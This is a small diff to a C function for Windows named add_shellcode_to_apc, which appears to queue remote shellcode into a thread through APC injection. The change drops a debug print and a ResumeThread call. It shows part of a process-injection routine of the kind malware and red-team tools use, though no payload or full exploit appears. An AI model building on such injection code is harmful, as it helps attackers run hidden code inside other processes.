@@ -12,8 +12,5 @@ bool add_shellcode_to_apc(HANDLE hThread, LPVOID remote_shellcode_ptr)
         return false;
     }
     ZwSetInformationThread(hThread, ThreadTimes, 0, 0);
-    
-    printf("Resuming main thread...\n");
-    ResumeThread(hThread);
     return true;
 }
